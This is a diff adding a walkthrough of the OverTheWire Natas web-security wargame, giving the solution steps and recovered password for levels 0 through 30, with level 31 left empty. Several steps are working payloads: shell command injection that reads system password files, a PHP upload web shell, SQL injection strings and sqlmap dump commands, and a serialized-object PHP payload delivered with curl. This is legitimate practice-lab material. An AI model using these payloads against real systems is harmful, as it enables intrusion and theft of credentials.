@@ -1,0 +1,372 @@
+### Natas
+https://overthewire.org/wargames/natas/
+
+
+
+--->lvl0
+Username: natas0
+Password: natas0
+URL:      http://natas0.natas.labs.overthewire.org
+-----
+check page source:
+gtVrDuiDfck831PqWsLEZy5gyDz1clto
+-----
+
+
+--->lvl1
+Username: natas1
+URL:      http://natas1.natas.labs.overthewire.org
+-----
+Put "view-source:" at the beginning of the URL in address bar, Hit enter:
+ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+-----
+
+
+--->lvl2
+Username: natas2
+URL:      http://natas2.natas.labs.overthewire.org
+-----
+goto source, click on pixel.png link, then go up to files folder and click on users.txt:
+sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+-----
+
+
+--->lvl3
+Username: natas3
+URL:      http://natas3.natas.labs.overthewire.org
+-----
+check robots.txt by adding /robots.txt/ at the url, then from that file you find out tyo goto /s3cr3t/ and there open users.txt:
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+-----
+
+
+--->lvl4
+Username: natas4
+URL:      http://natas4.natas.labs.overthewire.org
+-----
+as page indicates that we should come from lvl5 page, we usr curl on terminal to trick him:
+curl 'http://natas4.natas.labs.overthewire.org/' -H 'Referer: http://natas5.natas.labs.overthewire.org/' -u natas4
+enter the pass for natas 4 and:
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+-----
+
+
+--->lvl5
+Username: natas5
+URL:      http://natas5.natas.labs.overthewire.org
+-----
+have to edit cookie and set login value from 0 to 1 (use firefox dev tools, local storage and find cookie and double click to edit any value) then reload:
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+-----
+
+
+--->lvl6
+Username: natas6
+URL:      http://natas6.natas.labs.overthewire.org
+-----
+click on view source, notice includes/secret.inc so add it to url and check page source and find the secret then submit it in the main page:
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+-----
+
+
+--->lvl7
+Username: natas7
+URL:      http://natas7.natas.labs.overthewire.org
+-----
+go to source, notice the adress, copy it, in main page click on home then replace the 'home' in the url with the address:
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+-----
+
+
+--->lvl8
+Username: natas8
+URL:      http://natas8.natas.labs.overthewire.org
+-----
+check the source, reverse the encoding function and find and submit the secret:
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+-----
+
+
+--->lvl9
+Username: natas9
+URL:      http://natas9.natas.labs.overthewire.org
+-----
+check the source, its running grep command through passthru(), so we should be able to run our command as well so type in:
+;cat /etc/natas_webpass/natas10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+-----
+
+
+--->lvl10
+Username: natas10
+URL:      http://natas10.natas.labs.overthewire.org
+-----
+in grep search '.' means any character and grep can search multiple file so lets enter:
+. /etc/natas_webpass/natas11
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+-----
+
+
+--->lvl11
+Username: natas11
+URL:      http://natas11.natas.labs.overthewire.org
+-----
+reverse the function using cookie data to get the encryprion key and then use the key to create new data with show pass fiels set to yes and inject it to the cookie:
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+-----
+
+
+---<lvl12
+Username: natas12
+URL:      http://natas12.natas.labs.overthewire.org
+-----
+create a file like natas12.php with this inside:  <?php echo exec("cat /etc/natas_webpass/natas13"); ?>
+browse and choose the file but before upload go to inpect dev tool and change the extension of the created file from jpg to php and upload.
+once uploaded click on it:
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+-----
+
+
+--->lvl13
+Username: natas13
+URL:      http://natas13.natas.labs.overthewire.org
+-----
+create a similar file for natas14 pass and name it jpg.  then injext the following for bytes with hex editor to the beginig of the file 'FF D8 FF DB' so it will be checked as jpg file.  then choose and before upload change the extension to php and upload:
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+-----
+
+
+--->lvl14
+Username: natas14
+URL:      http://natas14.natas.labs.overthewire.org
+-----
+feed any user name that starts with double quote like: "test
+you will see an error message that the login form is probably vulnerable for SQL injection. so feed the following payload as username: " or 1 = 1 #
+which will translate to:
+SELECT * from users where username="" or 1 = 1 # and password = ""
+:::> # means ignore comments
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+-----
+
+
+--->lvl15
+Username: natas15
+URL:      http://natas15.natas.labs.overthewire.org
+-----
+we can see the sql server is vulnerable for injection so have to find out what characters are in the password and then build the password.
+write a script (natas15.sh) to first finds out characters included in password and then loop and arrange them:
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+-----
+
+
+--->lvl16
+Username: natas16
+URL:      http://natas16.natas.labs.overthewire.org
+-----
+they have filtered many special characters but not the $. so we can execute commands in the form of '$(some command)'. just need to use a word that exists in the dictionary and run the command that we want after that.  so we gonna use a script like before:
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+-----
+
+
+--->lvl17
+Username: natas17
+URL:      http://natas17.natas.labs.overthewire.org
+-----
+here we are using kali tool called sqlmap
+
+sqlmap --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type="Basic" -u 'http://natas17.natas.labs.overthewire.org/index.php?username=' --level 3 --dbms='MySQL 5.5' -p username --technique T --dbs --ignore-code=401
+
+thsi shows table for natas 17 exists
+-----
+sqlmap --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u "http://natas17.natas.labs.overthewire.org/index.php?username=natas17" --level 3 -p username --technique T -D natas17 -T users -C username,password --dump --ignore-code=401
+-----
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+-----
+
+
+--->lvl18
+Username: natas18
+URL:      http://natas18.natas.labs.overthewire.org
+-----
+we use a script to brute force and find the PHPSESSID for admin and then edit that number in the cookie:
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+-----
+
+
+--->lvl19
+Username: natas19
+URL:      http://natas19.natas.labs.overthewire.org
+-----
+checking the cookie we see a hex string that when decoded gives 3digit-admin.
+so we right script to brute force 3didit-admin strings in hex format:
+eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+-----
+
+
+--->lvl20
+Username: natas20
+URL:      http://natas20.natas.labs.overthewire.org
+-----
+add the following to the url and enter and reload:
+?debug=1&name=test%0Aadmin 1
+-----
+IFekPyrQXftziDEsUr3x21sYuahypdgJ
+-----
+
+
+--->lvl21
+Username: natas21
+URL:      http://natas21.natas.labs.overthewire.org
+-----
+make sure both pages are have same SSEID or set them same.  then add the following to the second page url:
+debug=1&align=center&fontsize=100%25&bgcolor=blue&admin=1&submit=Update
+press enter and reload.  now go and reload the first page
+-----
+chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+-----
+
+
+--->lvl22
+Username: natas22
+URL:      http://natas22.natas.labs.overthewire.org
+-----
+curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ 'http://natas22.natas.labs.overthewire.org?revelio=1'
+-----
+D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+-----
+
+
+--->lvl23
+Username: natas23
+URL:      http://natas23.natas.labs.overthewire.org
+-----
+code shows that we need to input password 'iloveyou' and for it to be greater than 10.
+enter something like 11iloveyou
+-----
+OsRmXFguozKpTZZ5X14zNO43379LZveg
+-----
+
+
+--->lvl24
+Username: natas24
+URL:      http://natas24.natas.labs.overthewire.org
+-----
+make an empty submit and set the url as below to break strcmp()
+http://natas24.natas.labs.overthewire.org/?passwd[]=%22%22
+-----
+GHF6X7YwACaYYssHVY05cFq83hRktl4c
+-----
+
+
+--->lvl25
+Username: natas25
+URL:      http://natas25.natas.labs.overthewire.org
+-----
+see the bash script:
+-----
+oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+-----
+
+
+--->lvl26
+Username: natas26
+URL:      http://natas26.natas.labs.overthewire.org
+-----
+empty submit then change the value for draw in cookie to something like "Love'. you will see that vulnerable line is 70.
+so we will creat payload.php with following:
+
+<?php
+class Logger{
+  private $logFile = "img/hello.php";
+  private $initMsg = "";
+  private $exitMsg = "<?= file_get_contents('/etc/natas_webpass/natas27') ?>";
+}
+$x = new Logger();
+echo base64_encode(serialize($x));
+-----
+php payload.php > payload
+-----
+curl --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/ -b "drawing=$(cat payload)"
+-----
+curl --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/img/hello.php
+-----
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+-----
+
+
+--->lvl27
+Username: natas27
+URL:      http://natas27.natas.labs.overthewire.org
+-----
+enter a user name that starts with natas28 then more than 64 spaces and some random string, with any passeord.
+it says user created. then try to login with just natas28 as username and the same password: 
+-----
+JWwR438wkgTsNKBbcJoowyysdM82YjeF
+-----
+
+
+--->lvl28
+Username: natas28
+URL:      http://natas28.natas.labs.overthewire.org
+-----
+run the nats29.py and we get pass:
+-----
+airooCaiseiyee8he8xongien9euhe8b
+-----
+
+
+--->lvl29
+Username: natas29
+URL:      http://natas29.natas.labs.overthewire.org
+-----
+looking at the URL shows its a command injection so change the url to:
+
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00
+-----
+wie9iexae0Daihohv8vuu3cei9wahf0e
+-----
+
+
+--->lvl30
+Username: natas30
+URL:      http://natas30.natas.labs.overthewire.org
+-----
+runt the natas30.py and we get the pass:
+_____
+hay7aecuungiuKaezuathuk9biin0pu1
+-----
+
+
+--->lvl31
+Username: natas31
+URL:      http://natas31.natas.labs.overthewire.org
+-----
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
